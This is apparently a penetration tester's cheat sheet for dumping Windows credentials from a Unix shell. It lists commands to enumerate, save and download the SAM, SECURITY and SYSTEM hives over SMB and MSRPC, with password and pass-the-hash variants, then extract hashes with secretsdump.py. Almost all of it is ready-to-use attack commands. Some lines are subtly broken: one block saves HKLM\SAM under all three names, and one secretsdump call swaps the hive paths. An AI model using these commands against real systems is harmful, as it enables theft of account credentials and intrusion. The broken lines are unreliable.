---
author(s):
  - Userware
tags:
  - post-exploitation
  - os-credential-dumping
  - network-ports
  - msrpc
  - smb
  - staying-off-the-land
  - windows
---
# Unix Shell

## 01 - Manual Hashdump

### 1.1 - Enumerate hive files

Using `smbcacls` to enumerate the existing files.

```
$ cat << EOF > hive_files.txt
/Windows/System32/config/SAM
/Windows/System32/config/SECURITY
/Windows/System32/config/SYSTEM
/Windows/Repair/SAM
/Windows/Repair/SYSTEM
EOF

$ while read line; do echo "Hive filename: $line\n"; smbcacls -U "[<domain>/]<username>%<password>" //<IP>/C$ $line 2>/dev/null; done < hive_files.txt

$ while read line; do echo "Hive filename: $line\n"; smbcacls -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ $line 2>/dev/null; done < hive_files.txt
```

Using `smbclient` to enumerate the existing files while enabling `showacls`.

```
smb: \> showacls

smb: \> ls /Windows/System32/config/SAM

smb: \> ls /Windows/System32/config/SECURITY

smb: \> ls /Windows/System32/config/SYSTEM
```

### 1.2 - Extract hive files

#### 1.2.1 - MSRPC Port

```
$ export IP="<target_IP>"
export PROTOCOL="<ads | rpc>"
export USERNAME="<username>"
export PASSWORD="<password>"
export DOMAIN="<DOMAIN>"
net $PROTOCOL registry save "HKLM\SAM" "C:\Windows\Temp\SAM" -U "$DOMAIN$USERNAME%$PASSWORD" -S $IP
net $PROTOCOL registry save "HKLM\SECURITY" "C:\Windows\Temp\SECURITY" -U "$DOMAIN$USERNAME%$PASSWORD" -S $IP
net $PROTOCOL registry save "HKLM\SYSTEM" "C:\Windows\Temp\SYSTEM" -U "$DOMAIN$USERNAME%$PASSWORD" -S $IP
```

Pass The Hash

```
$ export IP="<target_IP>"
export PROTOCOL="<ads | rpc>"
export USERNAME="<username>"
export NT_HASH="<nt_hash>"
export DOMAIN="<DOMAIN>"
net $PROTOCOL registry save "HKLM\SAM" "C:\Windows\Temp\SAM" -U "$DOMAIN$USERNAME" --pw-nt-hash $NT_HASH -S $IP
net $PROTOCOL registry save "HKLM\SAM" "C:\Windows\Temp\SECURITY" -U "$DOMAIN$USERNAME" --pw-nt-hash $NT_HASH -S $IP
net $PROTOCOL registry save "HKLM\SAM" "C:\Windows\Temp\SYSTEM" -U "$DOMAIN$USERNAME" --pw-nt-hash $NT_HASH -S $IP
```

#### 1.2.2 - SMB Port

TODO: Modify the permissions with `smbcacls` in order to download them

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ -c "get /Windows/System32/config/SAM; get /Windows/System32/config/SECURITY; get /Windows/System32/config/SYSTEM"

$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ -c "get /Windows/System32/config/SAM; get /Windows/System32/config/SECURITY; get /Windows/System32/config/SYSTEM"
```

### 1.3 - Download hive files

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ -c "get /Windows/Temp/SAM SAM; get /Windows/Temp/SECURITY SECURITY; get /Windows/Temp/SYSTEM SYSTEM"

$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ -c "get /Windows/Temp/SAM SAM; get /Windows/Temp/SECURITY SECURITY; get /Windows/Temp/SYSTEM SYSTEM"
```

### 1.4 - Parse hive files

Create a temporary folder for mounting an SMB share.

```
# mkdir /mnt/share
```

Mount SMB share with various authentication methods.

```
# mount -t cifs -o [domain=<domain>,]username=<username>,password=<password>,rw //<IP>/C$ /mnt/share

# smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw

# mount -t cifs -o [domain=<domain>,]username=<username>,password=<nt_hash>,sec=ntlmssp,rw //<IP>/C$ /mnt/share

# mount -t cifs -o sec=krb5,vers=3.0,rw '//<IP>/C$' /mnt/share
```

Harvest the credentials.

```
# secretsdump.py -sam /mnt/share/Windows/System32/config/SAM -system /mnt/share/Windows/System32/config/SYSTEM local

# secretsdump.py -sam /mnt/share/Windows/System32/config/SAM -security /mnt/share/Windows/System32/config/SYSTEM -system /mnt/share/Windows/System32/config/SECURITY local
```

If you have already downloaded the HIVE files. Then parse them with the fields.

```
$ secretsdump.py -sam /path/to/sam_hive_file -system /path/to/system_hive_file local

$ secretsdump.py -sam /path/to/sam_hive_file -security /path/to/security_hive_file -system /path/to/system_hive_file local
```

---
## References

- [Samdump2](https://salsa.debian.org/pkg-security-team/samdump2)

### Wadcoms

- [Wadcoms: Impacket Secretsdump](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/)

### The Hacker Recipes

- [The Hacker Recipes: NTDS secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)